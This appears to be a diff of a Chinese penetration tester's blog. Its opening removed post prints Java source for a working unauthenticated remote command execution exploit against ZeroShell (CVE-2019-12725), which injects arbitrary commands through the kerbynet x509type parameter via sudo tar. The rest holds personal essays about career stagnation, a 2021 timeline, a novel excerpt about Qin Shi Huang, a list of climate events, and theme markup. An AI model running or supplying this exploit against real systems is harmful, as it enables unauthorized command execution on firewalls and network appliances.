class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fun.fireline.exp.zeroshell;</span><br><span class="line"><span class="keyword">import</span>  fun.fireline.core.ExploitInterface;</span><br><span class="line"><span class="keyword">import</span> fun.fireline.tools.HttpTools;</span><br><span class="line"><span class="keyword">import</span> fun.fireline.tools.Response;</span><br><span class="line"><span class="keyword">import</span> fun.fireline.tools.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Givemefivw</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/12/18</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> &lt;https://github.com/givemefivw&gt;</span></span><br><span class="line"><span class="comment"> * ZeroShell 远程代码执行漏洞 使用神机框架编写的第一个漏洞</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ZeroShell</span> <span class="keyword">implements</span> <span class="title class_">ExploitInterface</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">isVul</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, String&gt; headers = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">checkVul</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = url;</span><br><span class="line">        <span class="comment">// 这里可以通过判断对方是否执行了 md5 计算，输出 61a0f37eada6108084f3298115fc1762 来验证漏洞是否存在</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">check_payload</span> <span class="operator">=</span> <span class="string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A%2Fetc%2Fsudo+tar+-cf+%2Fdev%2Fnull+%2Fdev%2Fnull+--checkpoint%3d1+--checkpoint-action%3dexec%3d\\&quot;</span>echo%2061a0f37eada6108084f3298115fc1762\\<span class="string">&quot;%0A&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">// get 请求，根据不同的exp，可能需要不同的请求方式，看需更改</span></span><br><span class="line">        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> HttpTools.get(<span class="built_in">this</span>.target + check_payload, <span class="built_in">this</span>.headers, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 看回显，是否存在 61a0f37eada6108084f3298115fc1762 md5(cve201912725)</span></span><br><span class="line">        <span class="keyword">if</span>(response.getText() != <span class="literal">null</span>  &amp;&amp; response.getText().contains(<span class="string">&quot;61a0f37eada6108084f3298115fc1762&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.isVul = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[+] 目标存在&quot;</span> + <span class="built_in">this</span>.getClass().getSimpleName() + <span class="string">&quot;漏洞 \\t &quot;</span> + <span class="string">&quot;Payload: \\t&quot;</span> + <span class="string">&quot;echo 61a0f37eada6108084f3298115fc1762&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (response.getError() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[-] 检测漏洞&quot;</span> + <span class="built_in">this</span>.getClass().getSimpleName() + <span class="string">&quot;失败， &quot;</span> + response.getError();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[-] 目标不存在&quot;</span> + <span class="built_in">this</span>.getClass().getSimpleName() + <span class="string">&quot;漏洞&quot;</span> + check_payload;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">exeCmd</span><span class="params">(String cmd, String encoding)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A%2Fetc%2Fsudo+tar+-cf+%2Fdev%2Fnull+%2Fdev%2Fnull+--checkpoint%3d1+--checkpoint-action%3dexec%3d\\&quot;</span>payload\\<span class="string">&quot;%0A&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换payload 中的 payload 字符为要执行的命令</span></span><br><span class="line">        payload = payload.replace(<span class="string">&quot;payload&quot;</span>, cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> HttpTools.get(<span class="built_in">this</span>.target + payload, <span class="built_in">this</span>.headers, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tools.regReplace(response.getText());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getWebPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A%2Fetc%2Fsudo+tar+-cf+%2Fdev%2Fnull+%2Fdev%2Fnull+--checkpoint%3d1+--checkpoint-action%3dexec%3d\\\\\\&quot;</span>pwd\\\\\\<span class="string">&quot;%0A&#x27;\\&quot;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">        Response response = HttpTools.get(this.target + payload, this.headers, &quot;</span>UTF-<span class="number">8</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // 这个payload会把 html网页也给输出，这里分割简单去除一下</span></span><br><span class="line"><span class="string">        return Tools.regReplace(response.getText());</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @Override</span></span><br><span class="line"><span class="string">    public String uploadFile(String fileContent, String filename, String platform) throws Exception &#123;</span></span><br><span class="line"><span class="string">        return null;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @Override</span></span><br><span class="line"><span class="string">    public boolean isVul() &#123;</span></span><br><span class="line"><span class="string">        return this.isVul;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>最后在项目根目录执行**<code>mvn package assembly:single</code>**即可生成jar文件：</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/mvnjar.png" alt="Untitled"></p>
-<p><code>mvn clean</code>用来清除生成的数据</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/clean.png" alt="Untitled"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/" data-id="cl0oq0f7k0028h0v0euqo1sov" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-阶段性技术能力总结" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/12/17/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%8A%80%E6%9C%AF%E8%83%BD%E5%8A%9B%E6%80%BB%E7%BB%93/" class="article-date">
-  <time datetime="2021-12-17T02:23:14.000Z" itemprop="datePublished">2021-12-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          <a class="icon" target="_blank" rel="noopener" href="/" aria-label="facebook">
+            <i class="fab fa-facebook"></i><!--
+      ---></a><!--
+    ---><!--
+    --->, 
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/17/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%8A%80%E6%9C%AF%E8%83%BD%E5%8A%9B%E6%80%BB%E7%BB%93/">阶段性技术能力总结</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
       
-        <p>从去年七月份第一次实习开始到现在一年的时间，算下来收获其实很多，无论技术上还是工作上。</p>
-<p>但是最近越来越觉得自己现在处于一个难受的瓶颈期。</p>
-<p>刚实习的时候，被派到一个长期的项目上，作为实习生每天的工作很简单，拿着扫描器直接扫描验证，就是那时候才积累了一些粗浅的经验。</p>
-<p>上半年的时候1月份驻场到三月末，紧接着第一次出差广州，然后回来一周时间四月初继续重庆出差半个多月，然后又回来一周时间，五月份继续去北京，然后返校答辩，毕业后九月份又去了成都。</p>
-<p>上半年真的特别充实，每一段时间我都可以接触到新东西，不只局限于技术，更多的是经验。当然，关于技术，不断地项目不断的技术支撑让我现在也算是小有心得。</p>
-<p>但是，我发现从下半年开始，我的那种“进化感”越来越弱，到现在几乎感受不到了。</p>
-<p>我真的处于一个瓶颈期。</p>
-<p>平常工作最多的就是Web渗透，漏洞无非是最常见的那几类。偶尔遇到中间件可以利用，则被告知最多是GetShell,不允许继续深入。所以我的内网渗透经验真的十分匮乏。偶尔也会搭建内网靶场训练，但是靶场毕竟是靶场，是知道它存在漏洞的，要做的无非是找到利用方法，而在实战中需要丰富的经验去判断如何利用。很遗憾，这正是我目前最缺少的。</p>
-<p>这一段时间似乎处于一个迷茫期。</p>
-<p>下半年由于部门职责调整，渗透的项目越来越少，最近一段时间更是一个都没有。</p>
-<p>每天早上坐在工位前都在想，今天要怎么过。</p>
-<p>当然知道如果没活的话可以自己学东西，</p>
-<p>但是学一段也会累，而且同样是个循环。</p>
-<p>前一段时间看了cdxy师傅的博客。</p>
-<p><img src="/2021/12/17/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%8A%80%E6%9C%AF%E8%83%BD%E5%8A%9B%E6%80%BB%E7%BB%93/cir.png" alt="循环"></p>
-<p>把图片中的KPI换成技术能力就是我现在的状态。</p>
-<p>之前一直在写自己的扫描器，用图片来描述就是找到目标，很兴奋。</p>
-<p>然后写的过程中确实很煎熬，有时候为了加入一个功能点要查好久的资料，还要改好多次BUG，然后每当实现一个功能的时候，也就是图中的逼近目标，也会很激动，紧接着就是乏味，最后是焦虑。</p>
-<p>这是一个难以逃脱的循环。</p>
-<p>cdxy师傅说，快乐并非来自目标本身，而是成长的速度。</p>
-<p>的确，细想一下，我的焦虑似乎就是出现在自身的成长速度上面。</p>
-<p>我已经原地停留了很久。</p>
-<p>或许，当我选择渗透作为职业的时候，注定我会有这一天。</p>
-<p>接下来的一个问题，到底是什么原因让我自己在原地停滞不前并且满怀焦虑。</p>
-<p>细想下来大抵是因为自己对代码不够熟悉，甚至可以说完全不熟悉。</p>
-<p>一直没有系统的学过一门语言，对Java、Go都只是停留在入门的阶段，Python的高级用法、多线程仍然还不会。</p>
-<p>我特别羡慕那些会代码的渗透，他们对漏洞的成因和利用比我深刻的多。</p>
-<p>每天逛技术社区和论坛的时候，看到漏洞分析的文章，我也会点开看，但是无奈的是我真的一点也看不懂，对代码的生疏让我只能选择利用公开的工具，而不是自己去创造。</p>
-<p>还可能是自己的项目经验还不足够。</p>
-<p>前面提到过，对内网的经验很少。项目中多为Web侧，且不允许进行深度利用，导致技术点很薄弱。</p>
-<p>对今年一整年的技术储备，上半年可圈可点，下半年对自己极不满意，可以说下半年几乎没有什么技术突破，导致现在很焦虑。</p>
-<p>不知道如何才能化解这份焦虑。</p>
-<p>有了问题之后，首要问题是如何解决，有很多idea：</p>
-<ul>
-<li>学习代码，提高代码审计能力</li>
-<li>刷SRC，攒排名</li>
-<li>寻找内网项目</li>
-</ul>
-<p>所以下一阶段的目标就是找到一个技术目标，并想法设法实现。</p>
-<p>也可以算作2022年的期望。</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">————<span class="number">2021.12</span><span class="number">.16</span> 日晚</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/12/17/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%8A%80%E6%9C%AF%E8%83%BD%E5%8A%9B%E6%80%BB%E7%BB%93/" data-id="cl0oq0f7r0039h0v0cy455bfl" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-2021年时间线记录" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/12/09/2021%E5%B9%B4%E6%97%B6%E9%97%B4%E7%BA%BF%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time datetime="2021-12-09T09:52:11.000Z" itemprop="datePublished">2021-12-09</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/09/2021%E5%B9%B4%E6%97%B6%E9%97%B4%E7%BA%BF%E8%AE%B0%E5%BD%95/">2021年时间线记录</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>博客搭建也算是一整年了，今年似乎过得特别快，记录一下2021年我的时间线。</p>
-<p>2020年12月20日晚上，博客正式搭建，当时用的主题叫做diaspora，后来发现手机端访问效果不是很好看，一个月后改成了xups。</p>
-<p>因为疫情地原因，春节没能回去老家，原地过年。和同学搞了点外快。年三十晚上两个人去的一家饭店点了几个菜几杯酒，也算是过年了。</p>
-<p>三月份第一次出差，现场技术支撑，两天时间。当时在另一个项目上，因为是临时出差，下午接到消息晚上就要赶飞机，又要交接工作，所以有点紧张，不知道目标好不好搞，能不能有产出。晚上九点的飞机，凌晨一点下的飞机，酒店离机场五十多公里，又是半夜，没办法，只能自己打车，滴滴半天没人接单，又等了好长时间才有一辆空车，大概凌晨三点到的酒店，打电话叫另一个同事下来开门，到了房间啥也没管脱了衣服倒头就睡。第二天早上八点多起来，甲方九点之前上班，离得倒是不远，结果到了门口才知道进出必须要预约，临时提了预约然后另一个同事给甲方老师打的电话，记得先后打了三次，终于九点二十多到了办公室。然后发现没有工位，还好那天有个同事没来，有个坐的地方。然后开电脑之后突然想起来昨天对接的同事还没有给我发资产，又电话联系。临近吃饭才正式开始。后来也算是憋出来点东西，不至于没法交差。</p>
-<p>第一次出差一个是还不太懂，一个是时间比较紧。后来第二次出差的时候就有些经验了。</p>
-<p>三月份回来之后隔了一周，又接到出差通知，这次要半个月。</p>
-<p>有了上次经验之后，出差之前准备了行李箱，洗漱用品，酒店，路线什么的，然后时间也比较充足。休息时间还可以去周边溜溜。而且酒店是公寓式，屋子特别大，那半个月过的很爽。</p>
-<p>五月份从之前的项目中退出来，参加了另一个短期的出差。不过这次是非技术支撑，内容和我本职工作相差比较大。总的来说这次出差也算是学到了一些新东西。项目组成员有几个同期的实习生，约好了快结束的时候一起旅游，但是最后因为时间太赶没能实现。还是有点小遗憾的。</p>
-<p>五月末回到学校，准备毕设毕业。</p>
-<p>说起毕设，因为学校里老师们都不懂渗透，我的题目也是自拟的，完全以代码的形式，没有涉及硬件，所以我的导师只抠我的论文排版格式，其他具体内容跟我说只要我懂就可以了hhh。最后答辩的时候也一样，老师不是很懂渗透，所以也没有过多的问我问题，最后打分的时候老师说给了我她这组答辩最高的分数hhh。回过头来看我的设计，在安全圈内只能说算是个最最基础的设计。后来把设计重写了一次，也就是之前发过的WebFoxScanner，一个简单的扫描器。勉强算是有了一个初级的框架。</p>
-<p>六月二十号毕业，没有留下来参加毕业典礼，回到家里待了一周，月末和同学飞到上海，第二天就要准备搬家。说起搬家，平常没觉得自己东西很多，但是搬家收拾的时候，大包小包各种乱七八糟的东西，都快堆满了整个走廊。找了货拉拉。六月最后一天下午入住的新房子。也没闲着，又要收拾东西。</p>
-<p>七月一号回到公司，这时候没有学校的繁杂事情了。</p>
-<p>因为部门职责调整，下半年就没有那么多的出差了。</p>
-<p>七八月份一直远程跟进一个项目，对方的一个软件不知道为什么总是出现问题。</p>
-<p>九月份又出了一次差，也是技术支撑，在现场产出效果还是不错的。时间关系中秋在出差地过的，一个人吃了顿烧烤，又去了当地的景区（别问我为啥没吃月饼hhh），十一之前结束出差。</p>
-<p>十一期间大学同学离的近的都跑来我们这，三个屋放了七个大小伙子。</p>
-<p>十一之后原本说有个现场支撑，但后来对方的档期问题就不需要我去支撑了。</p>
-<p>之后到现在偶尔是远程的活，说起来也有三个月没出差了。</p>
-<p>总结起来大概就是上半年马不停蹄，下半年划水摸鱼。</p>
-<p>明年开始准备考行业证书，毕竟这行业以后也是要看证书的。至于技术层面，只能说靠长久的积累了，毕竟半路出身根基比较薄弱。</p>
-<p>最后，愿未来可期！</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">———— 2021.12.09</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/12/09/2021%E5%B9%B4%E6%97%B6%E9%97%B4%E7%BA%BF%E8%AE%B0%E5%BD%95/" data-id="cl0oq0f710003h0v0gux13jwu" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-大秦帝国始皇帝片段" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/12/09/%E5%A4%A7%E7%A7%A6%E5%B8%9D%E5%9B%BD%E5%A7%8B%E7%9A%87%E5%B8%9D%E7%89%87%E6%AE%B5/" class="article-date">
-  <time datetime="2021-12-09T06:11:34.000Z" itemprop="datePublished">2021-12-09</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          <a class="icon" target="_blank" rel="noopener" href="/" aria-label="linkedin">
+            <i class="fab fa-linkedin"></i><!--
+      ---></a><!--
+    ---><!--
+    ---> y 
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/09/%E5%A4%A7%E7%A7%A6%E5%B8%9D%E5%9B%BD%E5%A7%8B%E7%9A%87%E5%B8%9D%E7%89%87%E6%AE%B5/">大秦帝国始皇帝片段</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
       
-        <p>在孙皓晖的《大秦帝国》书中，嬴政统一六国后，和大儒侯生有过一次对话，这段对话一直很喜欢，带着始皇帝的嬉笑怒骂。</p>
-<p>“杀人无算，白骨如山，暴政苛刑；绝文学之路，烧三代典籍，掘先哲之墓！修长城毁我华夏龙脉，筑驰道毁我民居良田。此等无道之国，无道之君，虽十亡，不足以平天下之怨。秦皇不亡，岂有天理也！”侯生突然打住了。</p>
-<p>“先生，朕听着，请说。”嬴政皇帝静如一池秋水。</p>
-<p>”不够么？没有了！“侯生气咻咻喊了一句。</p>
-<p>”嬴政愿闻大政之失，譬如郡县制究有何错？复辟旧制究有何好？“</p>
-<p>”人德尚且不立，谈何大政。“</p>
-<p>”可否说，先生挑不出秦之大政弊端？“</p>
-<p>”老夫不屑言败德之政。“</p>
-<p>”啊，明白也。“嬴政皇帝微微一笑，继而突然仰天大笑一阵，转身看着侯生笑道，”先生这般儒生，当真不可思议也！评判一个国家，一个君王，不看大政得失，专攻一己私德，这叫甚眼光？分明如村妇之舌，如市井之议，却偏偏地装扮成圣人之道，诚可笑也！你等儒家，何以不见大秦一统天下，结束数百年战乱，而使天下兵戈止息？何以不见大秦扫灭边患，使华夏族类得以长存？何以不见郡县制代替诸侯制，使华夏族群裂土不再，内争大战从此止息？何以不见天下奴隶得以实田，万民安居乐业？修驰道、掘川防、拓疆域、一文字、一度量衡、私田得以买卖，工商得以昌盛，如此等等，何以不见？··· ···是也，嬴政是拆迁了六国宫殿，是集中了六国宫女。然则，连绵宫殿嬴政住得几何？万千宫女嬴政消受得几个？至于为何要拆迁六国宫殿，六国宫女派甚用场，朕不想说！何以如此，只怕你等迂腐儒家永远不能明白！朕只说一句此乃防范复辟之需，此乃安定边陲之需，而绝非嬴政卧榻之需！纵然过了些许，何伤于秦之大政之道，何伤于大秦文明功业？方才先生所言，嬴政可以改弦更张，可以反躬自省。然，绝不表明六国贵族于尔等儒家之梦想能够成真。朕可直言相告，就像先生对我一般：只要人民拥护大秦新政，大秦就永远不会灭亡！几百儒生，几个博士，几万贵族，就想颠覆大秦，就想复辟旧制，先生不觉是螳臂当车么？朕还要告诉你，你这个博士，你等那个儒家，其实并没有真实学问。自孔孟以后，儒家关起门自吹自擂，不走天下，不读百家，狭隘又迂腐，论国论政全无半点雄风！朕为之寒心，天下嗤之以鼻，儒家若不再生，必将自取灭亡也！“</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/12/09/%E5%A4%A7%E7%A7%A6%E5%B8%9D%E5%9B%BD%E5%A7%8B%E7%9A%87%E5%B8%9D%E7%89%87%E6%AE%B5/" data-id="cl0oq0f7h001xh0v00dsm61gn" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="tag">读书笔记</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-2021年上半年地球事记" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/12/08/2021%E5%B9%B4%E4%B8%8A%E5%8D%8A%E5%B9%B4%E5%9C%B0%E7%90%83%E4%BA%8B%E8%AE%B0/" class="article-date">
-  <time datetime="2021-12-08T05:53:39.000Z" itemprop="datePublished">2021-12-08</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/08/2021%E5%B9%B4%E4%B8%8A%E5%8D%8A%E5%B9%B4%E5%9C%B0%E7%90%83%E4%BA%8B%E8%AE%B0/">2021年上半年地球事记</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
+          <a class="icon" target="_blank" rel="noopener" href="motallkali@163.com" aria-label="mail">
+            <i class="fas fa-envelope"></i><!--
+      ---></a>
+        <!--
+    --->.
+        
       
-        <p>2021.02.06——非洲马达加斯加南部遭遇40年来最严重的干旱</p>
-<p>2021.02.16——美国南部多地遭遇百年一遇的暴雪天气，一夜骤降二十多度</p>
-<p>2021.05——墨西哥第二大湖奎采奥湖突然干旱枯竭</p>
-<p>2021.06.20——维尔霍扬斯克镇达到38摄氏度高温，打破北极圈有温度以来最高纪录</p>
-<p>2021.06.29——利顿小镇达到49.6摄氏度高温，成为加拿大历史最高温</p>
-<p>2021.07.01——科威特国达到74度超高温</p>
-<p>2021.07.12——美国加利福尼亚死亡谷地表温度达到81度，打破纪录</p>
-<p>2021.07.28——美国阿拉斯加半岛8.2级大地震</p>
-<p>2021.07——热带的巴西发生62年第一次异常降雪，雪层最厚达到一米</p>
-<p>2021.07——中国河南遭遇大暴雨</p>
-<p>2021.07.26——中国上海台风</p>
-<p>美国正迎来1200年来最为严重的干旱</p>
-<p>贝伦达水库闸门完全干涸</p>
-<p>美国加州、意大利、西班牙等地陆续爆发特大山火，数十万公顷的森林草原被摧毁</p>
-<p>自七月开始，欧洲迎来百年一遇的暴雨，交通系统瘫痪</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/12/08/2021%E5%B9%B4%E4%B8%8A%E5%8D%8A%E5%B9%B4%E5%9C%B0%E7%90%83%E4%BA%8B%E8%AE%B0/" data-id="cl0oq0f730007h0v03rhy3phz" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>
-
-    </footer>
-  </div>
+    </p>
   
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-  </nav>
-
 </section>
+
+<section id="writing">
+  <span class="h1"><a href="/archives/">Articulos</a></span>
+  
+  <span class="h2">Themen</span>
+  <span class="widget tagcloud">
+    <a href="/tags/error-solve/" style="font-size: 10px;">error&solve</a> <a href="/tags/frida/" style="font-size: 13.33px;">frida</a> <a href="/tags/tips/" style="font-size: 10px;">tips</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" style="font-size: 10px;">技术文章</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 20px;">渗透测试</a> <a href="/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/" style="font-size: 10px;">科学上网</a> <a href="/tags/%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7/" style="font-size: 10px;">编程技巧</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 13.33px;">脚本</a> <a href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" style="font-size: 13.33px;">读书笔记</a> <a href="/tags/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">逆向学习</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 16.67px;">随笔</a>
+  </span>
+  <span class="h2">Neueste</span>
+  
+  <ul class="post-list">
+    
+    
+      
+    
+    
+      <li class="post-item">
         
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%A9%E6%9C%BA%E6%8A%80%E5%B7%A7/">玩机技巧</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a></li></ul>
+    <div class="meta">
+      
+        
+          <time datetime="2022-03-13T03:37:21.000Z" itemprop="datePublished">2022-03-13</time>
+        
+      
     </div>
-  </div>
 
 
-  
+        <span>
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/error-solve/" rel="tag">error&solve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/frida/" rel="tag">frida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tips/" rel="tag">tips</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" rel="tag">技术文章</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/" rel="tag">科学上网</a></li><li class="tag-list-item"><a class="tag-list-link" 